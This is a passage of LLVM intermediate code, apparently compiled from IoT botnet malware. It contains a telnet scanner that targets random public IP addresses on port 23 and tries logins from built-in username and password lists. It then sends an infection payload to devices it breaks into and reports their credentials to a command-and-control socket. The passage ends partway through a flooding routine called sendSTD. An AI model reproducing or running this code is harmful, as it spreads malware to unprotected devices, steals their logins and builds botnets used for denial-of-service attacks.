define i32 @socket_connect(i8*, i16 zeroext) local_unnamed_addr #1 {
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca i32, align 4
  store i32 1, i32* %4, align 4
  %5 = tail call %struct.hostent* @gethostbyname(i8* %0) #3
  %6 = icmp eq %struct.hostent* %5, null
  br i1 %6, label %27, label %7

; <label>:7:                                      ; preds = %2
  %8 = getelementptr inbounds %struct.hostent, %struct.hostent* %5, i64 0, i32 4
  %9 = load i8**, i8*** %8, align 8
  %10 = load i8*, i8** %9, align 8
  %11 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i64 0, i32 2
  %12 = bitcast %struct.in_addr* %11 to i8*
  %13 = getelementptr inbounds %struct.hostent, %struct.hostent* %5, i64 0, i32 3
  %14 = load i32, i32* %13, align 4
  %15 = sext i32 %14 to i64
  call void @bcopy(i8* %10, i8* %12, i64 %15) #3
  %16 = tail call zeroext i16 @htons(i16 zeroext %1) #18
  %17 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i64 0, i32 1
  store i16 %16, i16* %17, align 2
  %18 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i64 0, i32 0
  store i16 2, i16* %18, align 4
  %19 = tail call i32 @socket(i32 2, i32 1, i32 6) #3
  %20 = bitcast i32* %4 to i8*
  %21 = call i32 @setsockopt(i32 %19, i32 6, i32 1, i8* nonnull %20, i32 4) #3
  %22 = icmp eq i32 %19, -1
  br i1 %22, label %27, label %23

; <label>:23:                                     ; preds = %7
  %24 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  %25 = call i32 @connect(i32 %19, %struct.sockaddr* nonnull %24, i32 16) #3
  %26 = icmp eq i32 %25, -1
  %. = select i1 %26, i32 0, i32 %19
  br label %27

; <label>:27:                                     ; preds = %23, %7, %2
  %.0 = phi i32 [ 0, %2 ], [ 0, %7 ], [ %., %23 ]
  ret i32 %.0
}

declare %struct.hostent* @gethostbyname(i8*) local_unnamed_addr #4

; Function Attrs: nounwind
declare void @bcopy(i8* nocapture readonly, i8* nocapture, i64) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) local_unnamed_addr #5

; Function Attrs: noinline noreturn nounwind uwtable
define void @TelnetScanner(i32, i32) local_unnamed_addr #12 {
  %3 = alloca %struct.__sigset_t, align 8
  %4 = alloca %struct.timeval, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = tail call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %9 = tail call i32 @rand_cmwc()
  %10 = xor i32 %9, %8
  tail call void @srand(i32 %10) #3
  %11 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i64 0, i32 0
  store i16 2, i16* %11, align 4
  %12 = tail call zeroext i16 @htons(i16 zeroext 23) #18
  %13 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i64 0, i32 1
  store i16 %12, i16* %13, align 2
  %14 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i64 0, i32 3, i64 0
  %15 = bitcast i8* %14 to i64*
  store i64 0, i64* %15, align 4
  %16 = tail call noalias i8* @malloc(i64 1025) #3
  tail call void @llvm.memset.p0i8.i64(i8* %16, i8 0, i64 1025, i32 1, i1 false)
  %17 = zext i32 %1 to i64
  %18 = alloca %struct.telstate_t, i64 %17, align 16
  %19 = bitcast %struct.telstate_t* %18 to i8*
  %20 = sext i32 %1 to i64
  %21 = mul nsw i64 %20, 5
  call void @llvm.memset.p0i8.i64(i8* nonnull %19, i8 0, i64 %21, i32 16, i1 false)
  %22 = icmp sgt i32 %1, 0
  br i1 %22, label %.lr.ph105.preheader, label %.preheader102.preheader

.lr.ph105.preheader:                              ; preds = %2
  %xtraiter = and i64 %17, 1
  %lcmp.mod = icmp eq i64 %xtraiter, 0
  br i1 %lcmp.mod, label %.lr.ph105.prol.loopexit, label %.lr.ph105.prol.preheader

.lr.ph105.prol.preheader:                         ; preds = %.lr.ph105.preheader
  br label %.lr.ph105.prol

.lr.ph105.prol:                                   ; preds = %.lr.ph105.prol.preheader
  %23 = bitcast %struct.telstate_t* %18 to i8*
  call void @llvm.memset.p0i8.i64(i8* %23, i8 0, i64 32, i32 16, i1 false)
  %24 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 0, i32 3
  store i8 1, i8* %24, align 1
  %25 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 0, i32 9
  store i8* %16, i8** %25, align 8
  br label %.lr.ph105.prol.loopexit

.lr.ph105.prol.loopexit:                          ; preds = %.lr.ph105.preheader, %.lr.ph105.prol
  %indvars.iv106.unr = phi i64 [ 0, %.lr.ph105.preheader ], [ 1, %.lr.ph105.prol ]
  %26 = icmp eq i32 %1, 1
  br i1 %26, label %.preheader102.preheader.loopexit, label %.lr.ph105.preheader.new

.lr.ph105.preheader.new:                          ; preds = %.lr.ph105.prol.loopexit
  br label %.lr.ph105

.lr.ph105:                                        ; preds = %.lr.ph105, %.lr.ph105.preheader.new
  %indvars.iv106 = phi i64 [ %indvars.iv106.unr, %.lr.ph105.preheader.new ], [ %indvars.iv.next107.1, %.lr.ph105 ]
  %27 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %indvars.iv106
  %28 = bitcast %struct.telstate_t* %27 to i8*
  call void @llvm.memset.p0i8.i64(i8* %28, i8 0, i64 32, i32 16, i1 false)
  %29 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %indvars.iv106, i32 3
  store i8 1, i8* %29, align 1
  %30 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %indvars.iv106, i32 9
  store i8* %16, i8** %30, align 8
  %indvars.iv.next107 = add nuw nsw i64 %indvars.iv106, 1
  %31 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %indvars.iv.next107
  %32 = bitcast %struct.telstate_t* %31 to i8*
  call void @llvm.memset.p0i8.i64(i8* %32, i8 0, i64 32, i32 16, i1 false)
  %33 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %indvars.iv.next107, i32 3
  store i8 1, i8* %33, align 1
  %34 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %indvars.iv.next107, i32 9
  store i8* %16, i8** %34, align 8
  %indvars.iv.next107.1 = add nsw i64 %indvars.iv106, 2
  %exitcond.1 = icmp eq i64 %indvars.iv.next107.1, %17
  br i1 %exitcond.1, label %.preheader102.preheader.loopexit.unr-lcssa, label %.lr.ph105

.preheader102.preheader.loopexit.unr-lcssa:       ; preds = %.lr.ph105
  br label %.preheader102.preheader.loopexit

.preheader102.preheader.loopexit:                 ; preds = %.lr.ph105.prol.loopexit, %.preheader102.preheader.loopexit.unr-lcssa
  br label %.preheader102.preheader

.preheader102.preheader:                          ; preds = %.preheader102.preheader.loopexit, %2
  br label %.preheader102

.preheader102:                                    ; preds = %.preheader102.preheader, %.preheader102
  %indvars.iv = phi i64 [ %indvars.iv.next, %.preheader102 ], [ 0, %.preheader102.preheader ]
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %35 = getelementptr inbounds [11 x i8*], [11 x i8*]* @tmpdirs, i64 0, i64 %indvars.iv.next
  %36 = load i8*, i8** %35, align 8
  %37 = icmp eq i8* %36, null
  br i1 %37, label %.preheader, label %.preheader102

.preheader:                                       ; preds = %.preheader102
  %38 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %39 = getelementptr inbounds %struct.timeval, %struct.timeval* %4, i64 0, i32 0
  %40 = getelementptr inbounds %struct.timeval, %struct.timeval* %4, i64 0, i32 1
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit, %.preheader
  br i1 %22, label %.lr.ph.preheader, label %.loopexit

.lr.ph.preheader:                                 ; preds = %.loopexit
  %41 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i64 0, i32 2, i32 0
  %42 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %3, i64 0, i32 0, i64 0
  %43 = sext i32 %0 to i64
  %44 = bitcast i32* %6 to i8*
  br label %.lr.ph

.lr.ph:                                           ; preds = %306, %.lr.ph.preheader
  %.1103 = phi i32 [ %.mux, %306 ], [ 0, %.lr.ph.preheader ]
  %45 = sext i32 %.1103 to i64
  %46 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %45
  %47 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %45, i32 7
  %48 = load i32, i32* %47, align 16
  %49 = icmp eq i32 %48, 0
  br i1 %49, label %50, label %52

; <label>:50:                                     ; preds = %.lr.ph
  %51 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  store i32 %51, i32* %47, align 16
  br label %52

; <label>:52:                                     ; preds = %50, %.lr.ph
  %53 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %45, i32 2
  %54 = load i8, i8* %53, align 8
  switch i8 %54, label %306 [
    i8 0, label %55
    i8 1, label %96
    i8 2, label %128
    i8 3, label %147
    i8 4, label %165
    i8 5, label %184
    i8 6, label %202
    i8 7, label %245
  ]

; <label>:55:                                     ; preds = %52
  %56 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %45, i32 3
  %57 = load i8, i8* %56, align 1
  switch i8 %57, label %77 [
    i8 1, label %58
    i8 0, label %65
  ]

; <label>:58:                                     ; preds = %55
  %59 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %45, i32 9
  %60 = bitcast i8** %59 to i64*
  %61 = load i64, i64* %60, align 8
  %62 = bitcast %struct.telstate_t* %46 to i8*
  call void @llvm.memset.p0i8.i64(i8* %62, i8 0, i64 32, i32 16, i1 false)
  store i64 %61, i64* %60, align 8
  %63 = call i32 @GetRandomPublicIP()
  %64 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %45, i32 1
  store i32 %63, i32* %64, align 4
  br label %77

; <label>:65:                                     ; preds = %55
  %66 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %45, i32 5
  %67 = load i8, i8* %66, align 1
  %68 = add i8 %67, 1
  store i8 %68, i8* %66, align 1
  %69 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %45, i32 4
  %70 = load i8, i8* %69, align 2
  %71 = add i8 %70, 1
  store i8 %71, i8* %69, align 2
  %72 = icmp eq i8 %68, 20
  br i1 %72, label %73, label %74

; <label>:73:                                     ; preds = %65
  store i8 1, i8* %56, align 1
  br label %306

; <label>:74:                                     ; preds = %65
  %75 = icmp eq i8 %71, 20
  br i1 %75, label %76, label %77

; <label>:76:                                     ; preds = %74
  store i8 1, i8* %56, align 1
  br label %306

; <label>:77:                                     ; preds = %55, %74, %58
  store i16 2, i16* %11, align 4
  store i16 %12, i16* %13, align 2
  store i64 0, i64* %15, align 4
  %78 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %45, i32 1
  %79 = load i32, i32* %78, align 4
  store i32 %79, i32* %41, align 4
  %80 = call i32 @socket(i32 2, i32 1, i32 0) #3
  %81 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 0, i32 0
  store i32 %80, i32* %81, align 16
  %82 = icmp eq i32 %80, -1
  br i1 %82, label %306, label %83

; <label>:83:                                     ; preds = %77
  %84 = call i32 (i32, i32, ...) @fcntl(i32 %80, i32 3, i8* null) #3
  %85 = or i32 %84, 2048
  %86 = call i32 (i32, i32, ...) @fcntl(i32 %80, i32 4, i32 %85) #3
  %87 = load i32, i32* %81, align 16
  %88 = call i32 @connect(i32 %87, %struct.sockaddr* nonnull %38, i32 16) #3
  %89 = icmp eq i32 %88, -1
  br i1 %89, label %90, label %95

; <label>:90:                                     ; preds = %83
  %91 = tail call i32* @__errno_location() #18
  %92 = load i32, i32* %91, align 4
  %93 = icmp eq i32 %92, 115
  br i1 %93, label %95, label %94

; <label>:94:                                     ; preds = %90
  call void @reset_telstate(%struct.telstate_t* nonnull %46)
  br label %306

; <label>:95:                                     ; preds = %90, %83
  call void @advance_state(%struct.telstate_t* nonnull %46, i32 1)
  br label %306

; <label>:96:                                     ; preds = %52
  %97 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %42) #3, !srcloc !20
  %98 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 0, i32 0
  %99 = load i32, i32* %98, align 16
  %100 = srem i32 %99, 64
  %101 = zext i32 %100 to i64
  %102 = shl i64 1, %101
  %103 = sdiv i32 %99, 64
  %104 = sext i32 %103 to i64
  %105 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %3, i64 0, i32 0, i64 %104
  %106 = load i64, i64* %105, align 8
  %107 = or i64 %102, %106
  store i64 %107, i64* %105, align 8
  store i64 0, i64* %39, align 8
  store i64 %43, i64* %40, align 8
  %108 = add nsw i32 %99, 1
  %109 = call i32 @select(i32 %108, %struct.__sigset_t* null, %struct.__sigset_t* nonnull %3, %struct.__sigset_t* null, %struct.timeval* nonnull %4) #3
  switch i32 %109, label %122 [
    i32 1, label %110
    i32 -1, label %121
  ]

; <label>:110:                                    ; preds = %96
  store i32 4, i32* %5, align 4
  store i32 0, i32* %6, align 4
  %111 = load i32, i32* %98, align 16
  %112 = call i32 @getsockopt(i32 %111, i32 1, i32 4, i8* nonnull %44, i32* nonnull %5) #3
  %113 = load i32, i32* %6, align 4
  %114 = icmp eq i32 %113, 0
  br i1 %114, label %116, label %115

; <label>:115:                                    ; preds = %110
  call void @reset_telstate(%struct.telstate_t* nonnull %46)
  br label %306

; <label>:116:                                    ; preds = %110
  %117 = load i32, i32* %98, align 16
  %118 = call i32 (i32, i32, ...) @fcntl(i32 %117, i32 3, i8* null) #3
  %119 = and i32 %118, -2049
  %120 = call i32 (i32, i32, ...) @fcntl(i32 %117, i32 4, i32 %119) #3
  call void @advance_state(%struct.telstate_t* nonnull %46, i32 2)
  br label %306

; <label>:121:                                    ; preds = %96
  call void @reset_telstate(%struct.telstate_t* nonnull %46)
  br label %306

; <label>:122:                                    ; preds = %96
  %123 = load i32, i32* %47, align 16
  %124 = add i32 %123, 5
  %125 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %126 = icmp ult i32 %124, %125
  br i1 %126, label %127, label %306

; <label>:127:                                    ; preds = %122
  call void @reset_telstate(%struct.telstate_t* nonnull %46)
  br label %306

; <label>:128:                                    ; preds = %52
  %129 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 0, i32 0
  %130 = load i32, i32* %129, align 16
  %131 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %45, i32 9
  %132 = load i8*, i8** %131, align 8
  %133 = call i32 @read_until_response(i32 %130, i32 %0, i8* %132, i32 1024, i8** getelementptr inbounds ([5 x i8*], [5 x i8*]* @advances, i64 0, i64 0))
  %134 = icmp eq i32 %133, 0
  br i1 %134, label %141, label %135

; <label>:135:                                    ; preds = %128
  %136 = load i8*, i8** %131, align 8
  %137 = call i32 @contains_fail(i8* %136)
  %138 = icmp eq i32 %137, 0
  br i1 %138, label %140, label %139

; <label>:139:                                    ; preds = %135
  call void @advance_state(%struct.telstate_t* nonnull %46, i32 0)
  br label %306

; <label>:140:                                    ; preds = %135
  call void @advance_state(%struct.telstate_t* nonnull %46, i32 3)
  br label %306

; <label>:141:                                    ; preds = %128
  %142 = load i32, i32* %47, align 16
  %143 = add i32 %142, 7
  %144 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %145 = icmp ult i32 %143, %144
  br i1 %145, label %146, label %306

; <label>:146:                                    ; preds = %141
  call void @reset_telstate(%struct.telstate_t* nonnull %46)
  br label %306

; <label>:147:                                    ; preds = %52
  %148 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 0, i32 0
  %149 = load i32, i32* %148, align 16
  %150 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %45, i32 4
  %151 = load i8, i8* %150, align 2
  %152 = zext i8 %151 to i64
  %153 = getelementptr inbounds [20 x i8*], [20 x i8*]* @usernames, i64 0, i64 %152
  %154 = load i8*, i8** %153, align 8
  %155 = call i64 @strlen(i8* %154) #15
  %156 = call i64 @send(i32 %149, i8* %154, i64 %155, i32 16384) #3
  %157 = icmp slt i64 %156, 0
  br i1 %157, label %158, label %159

; <label>:158:                                    ; preds = %147
  call void @reset_telstate(%struct.telstate_t* nonnull %46)
  br label %306

; <label>:159:                                    ; preds = %147
  %160 = load i32, i32* %148, align 16
  %161 = call i64 @send(i32 %160, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.137, i64 0, i64 0), i64 2, i32 16384) #3
  %162 = icmp slt i64 %161, 0
  br i1 %162, label %163, label %164

; <label>:163:                                    ; preds = %159
  call void @reset_telstate(%struct.telstate_t* nonnull %46)
  br label %306

; <label>:164:                                    ; preds = %159
  call void @advance_state(%struct.telstate_t* nonnull %46, i32 4)
  br label %306

; <label>:165:                                    ; preds = %52
  %166 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 0, i32 0
  %167 = load i32, i32* %166, align 16
  %168 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %45, i32 9
  %169 = load i8*, i8** %168, align 8
  %170 = call i32 @read_until_response(i32 %167, i32 %0, i8* %169, i32 1024, i8** getelementptr inbounds ([5 x i8*], [5 x i8*]* @advances, i64 0, i64 0))
  %171 = icmp eq i32 %170, 0
  br i1 %171, label %178, label %172

; <label>:172:                                    ; preds = %165
  %173 = load i8*, i8** %168, align 8
  %174 = call i32 @contains_fail(i8* %173)
  %175 = icmp eq i32 %174, 0
  br i1 %175, label %177, label %176

; <label>:176:                                    ; preds = %172
  call void @advance_state(%struct.telstate_t* nonnull %46, i32 0)
  br label %306

; <label>:177:                                    ; preds = %172
  call void @advance_state(%struct.telstate_t* nonnull %46, i32 5)
  br label %306

; <label>:178:                                    ; preds = %165
  %179 = load i32, i32* %47, align 16
  %180 = add i32 %179, 3
  %181 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %182 = icmp ult i32 %180, %181
  br i1 %182, label %183, label %306

; <label>:183:                                    ; preds = %178
  call void @reset_telstate(%struct.telstate_t* nonnull %46)
  br label %306

; <label>:184:                                    ; preds = %52
  %185 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 0, i32 0
  %186 = load i32, i32* %185, align 16
  %187 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %45, i32 5
  %188 = load i8, i8* %187, align 1
  %189 = zext i8 %188 to i64
  %190 = getelementptr inbounds [20 x i8*], [20 x i8*]* @passwords, i64 0, i64 %189
  %191 = load i8*, i8** %190, align 8
  %192 = call i64 @strlen(i8* %191) #15
  %193 = call i64 @send(i32 %186, i8* %191, i64 %192, i32 16384) #3
  %194 = icmp slt i64 %193, 0
  br i1 %194, label %195, label %196

; <label>:195:                                    ; preds = %184
  call void @reset_telstate(%struct.telstate_t* nonnull %46)
  br label %306

; <label>:196:                                    ; preds = %184
  %197 = load i32, i32* %185, align 16
  %198 = call i64 @send(i32 %197, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.137, i64 0, i64 0), i64 2, i32 16384) #3
  %199 = icmp slt i64 %198, 0
  br i1 %199, label %200, label %201

; <label>:200:                                    ; preds = %196
  call void @reset_telstate(%struct.telstate_t* nonnull %46)
  br label %306

; <label>:201:                                    ; preds = %196
  call void @advance_state(%struct.telstate_t* nonnull %46, i32 6)
  br label %306

; <label>:202:                                    ; preds = %52
  %203 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 0, i32 0
  %204 = load i32, i32* %203, align 16
  %205 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %45, i32 9
  %206 = load i8*, i8** %205, align 8
  %207 = call i32 @read_until_response(i32 %204, i32 %0, i8* %206, i32 1024, i8** getelementptr inbounds ([11 x i8*], [11 x i8*]* @advances2, i64 0, i64 0))
  %208 = icmp eq i32 %207, 0
  br i1 %208, label %239, label %209

; <label>:209:                                    ; preds = %202
  %210 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  store i32 %210, i32* %47, align 16
  %211 = load i8*, i8** %205, align 8
  %212 = call i32 @contains_fail(i8* %211)
  %213 = icmp eq i32 %212, 0
  br i1 %213, label %215, label %214

; <label>:214:                                    ; preds = %209
  call void @advance_state(%struct.telstate_t* nonnull %46, i32 0)
  br label %306

; <label>:215:                                    ; preds = %209
  %216 = load i8*, i8** %205, align 8
  %217 = call i32 @contains_success(i8* %216)
  %218 = icmp eq i32 %217, 0
  br i1 %218, label %238, label %219

; <label>:219:                                    ; preds = %215
  %220 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %45, i32 3
  %221 = load i8, i8* %220, align 1
  %222 = icmp eq i8 %221, 2
  br i1 %222, label %223, label %224

; <label>:223:                                    ; preds = %219
  call void @advance_state(%struct.telstate_t* nonnull %46, i32 7)
  br label %306

; <label>:224:                                    ; preds = %219
  %225 = load i32, i32* @mainCommSock, align 4
  %226 = call i8* @get_telstate_host(%struct.telstate_t* nonnull %46)
  %227 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %45, i32 4
  %228 = load i8, i8* %227, align 2
  %229 = zext i8 %228 to i64
  %230 = getelementptr inbounds [20 x i8*], [20 x i8*]* @usernames, i64 0, i64 %229
  %231 = load i8*, i8** %230, align 8
  %232 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %45, i32 5
  %233 = load i8, i8* %232, align 1
  %234 = zext i8 %233 to i64
  %235 = getelementptr inbounds [20 x i8*], [20 x i8*]* @passwords, i64 0, i64 %234
  %236 = load i8*, i8** %235, align 8
  %237 = call i32 (i32, i8*, ...) @sockprintf(i32 %225, i8* getelementptr inbounds ([99 x i8], [99 x i8]* @.str.138, i64 0, i64 0), i8* %226, i8* %231, i8* %236)
  call void @advance_state(%struct.telstate_t* nonnull %46, i32 7)
  br label %306

; <label>:238:                                    ; preds = %215
  call void @reset_telstate(%struct.telstate_t* nonnull %46)
  br label %306

; <label>:239:                                    ; preds = %202
  %240 = load i32, i32* %47, align 16
  %241 = add i32 %240, 7
  %242 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %243 = icmp ult i32 %241, %242
  br i1 %243, label %244, label %306

; <label>:244:                                    ; preds = %239
  call void @reset_telstate(%struct.telstate_t* nonnull %46)
  br label %306

; <label>:245:                                    ; preds = %52
  %246 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  store i32 %246, i32* %47, align 16
  %247 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 0, i32 0
  %248 = load i32, i32* %247, align 16
  %249 = call i64 @send(i32 %248, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.139, i64 0, i64 0), i64 4, i32 16384) #3
  %250 = load i32, i32* %247, align 16
  %251 = call i64 @send(i32 %250, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.140, i64 0, i64 0), i64 7, i32 16384) #3
  %252 = load i32, i32* %247, align 16
  %253 = load i8*, i8** @infect, align 8
  %254 = call i64 @strlen(i8* %253) #15
  %255 = call i64 @send(i32 %252, i8* %253, i64 %254, i32 16384) #3
  %256 = icmp slt i64 %255, 0
  br i1 %256, label %257, label %271

; <label>:257:                                    ; preds = %245
  %258 = load i32, i32* @mainCommSock, align 4
  %259 = call i8* @get_telstate_host(%struct.telstate_t* nonnull %46)
  %260 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %45, i32 4
  %261 = load i8, i8* %260, align 2
  %262 = zext i8 %261 to i64
  %263 = getelementptr inbounds [20 x i8*], [20 x i8*]* @usernames, i64 0, i64 %262
  %264 = load i8*, i8** %263, align 8
  %265 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %45, i32 5
  %266 = load i8, i8* %265, align 1
  %267 = zext i8 %266 to i64
  %268 = getelementptr inbounds [20 x i8*], [20 x i8*]* @passwords, i64 0, i64 %267
  %269 = load i8*, i8** %268, align 8
  %270 = call i32 (i32, i8*, ...) @sockprintf(i32 %258, i8* getelementptr inbounds ([96 x i8], [96 x i8]* @.str.141, i64 0, i64 0), i8* %259, i8* %264, i8* %269)
  call void @reset_telstate(%struct.telstate_t* nonnull %46)
  br label %306

; <label>:271:                                    ; preds = %245
  %272 = load i32, i32* %47, align 16
  %273 = add i32 %272, 25
  %274 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %275 = icmp ult i32 %273, %274
  br i1 %275, label %276, label %306

; <label>:276:                                    ; preds = %271
  %277 = load i32, i32* @mainCommSock, align 4
  %278 = call i8* @get_telstate_host(%struct.telstate_t* nonnull %46)
  %279 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %45, i32 4
  %280 = load i8, i8* %279, align 2
  %281 = zext i8 %280 to i64
  %282 = getelementptr inbounds [20 x i8*], [20 x i8*]* @usernames, i64 0, i64 %281
  %283 = load i8*, i8** %282, align 8
  %284 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %45, i32 5
  %285 = load i8, i8* %284, align 1
  %286 = zext i8 %285 to i64
  %287 = getelementptr inbounds [20 x i8*], [20 x i8*]* @passwords, i64 0, i64 %286
  %288 = load i8*, i8** %287, align 8
  %289 = call i32 (i32, i8*, ...) @sockprintf(i32 %277, i8* getelementptr inbounds ([98 x i8], [98 x i8]* @.str.142, i64 0, i64 0), i8* %278, i8* %283, i8* %288)
  %290 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %45, i32 3
  %291 = load i8, i8* %290, align 1
  %292 = icmp eq i8 %291, 3
  br i1 %292, label %305, label %293

; <label>:293:                                    ; preds = %276
  %294 = load i32, i32* @mainCommSock, align 4
  %295 = call i8* @get_telstate_host(%struct.telstate_t* nonnull %46)
  %296 = load i8, i8* %279, align 2
  %297 = zext i8 %296 to i64
  %298 = getelementptr inbounds [20 x i8*], [20 x i8*]* @usernames, i64 0, i64 %297
  %299 = load i8*, i8** %298, align 8
  %300 = load i8, i8* %284, align 1
  %301 = zext i8 %300 to i64
  %302 = getelementptr inbounds [20 x i8*], [20 x i8*]* @passwords, i64 0, i64 %301
  %303 = load i8*, i8** %302, align 8
  %304 = call i32 (i32, i8*, ...) @sockprintf(i32 %294, i8* getelementptr inbounds ([99 x i8], [99 x i8]* @.str.143, i64 0, i64 0), i8* %295, i8* %299, i8* %303)
  br label %305

; <label>:305:                                    ; preds = %276, %293
  call void @reset_telstate(%struct.telstate_t* nonnull %46)
  br label %306

; <label>:306:                                    ; preds = %52, %164, %201, %95, %94, %127, %122, %146, %141, %183, %178, %244, %239, %305, %271, %214, %223, %224, %238, %176, %177, %139, %140, %115, %116, %77, %257, %200, %195, %163, %158, %121, %76, %73
  %307 = add nsw i32 %.1103, 1
  %308 = icmp slt i32 %307, %1
  %.mux = select i1 %308, i32 %307, i32 0
  br label %.lr.ph
}

declare i32 @time(...) local_unnamed_addr #4

; Function Attrs: nounwind
declare void @srand(i32) local_unnamed_addr #5

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #3

; Function Attrs: noinline noreturn nounwind uwtable
define void @sendSTD(i8*, i32, i32) local_unnamed_addr #12 {
  %4 = alloca %struct.sockaddr_in, align 4
  %5 = tail call i32 @socket(i32 2, i32 2, i32 0) #3
  %6 = tail call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %7 = sext i32 %6 to i64
  %8 = tail call %struct.hostent* @gethostbyname(i8* %0) #3
  %9 = bitcast %struct.sockaddr_in* %4 to i8*
  call void @llvm.memset.p0i8.i64(i8* nonnull %9, i8 0, i64 16, i32 4, i1 false)
  %10 = getelementptr inbounds %struct.hostent, %struct.hostent* %8, i64 0, i32 4
  %11 = load i8**, i8*** %10, align 8
  %12 = load i8*, i8** %11, align 8
  %13 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 2
  %14 = bitcast %struct.in_addr* %13 to i8*
  %15 = getelementptr inbounds %struct.hostent, %struct.hostent* %8, i64 0, i32 3
  %16 = load i32, i32* %15, align 4
  %17 = sext i32 %16 to i64
  call void @bcopy(i8* %12, i8* %14, i64 %17) #3
  %18 = getelementptr inbounds %struct.hostent, %struct.hostent* %8, i64 0, i32 2
  %19 = load i32, i32* %18, align 8
  %20 = trunc i32 %19 to i16
  %21 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 0
  store i16 %20, i16* %21, align 4
  %22 = trunc i32 %1 to i16
  %23 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 1
  store i16 %22, i16* %23, align 2
  %24 = bitcast %struct.sockaddr_in* %4 to %struct.sockaddr*
  %25 = sext i32 %2 to i64
  %26 = add nsw i64 %7, %25
  br label %27

; <label>:27:                                     ; preds = %42, %3
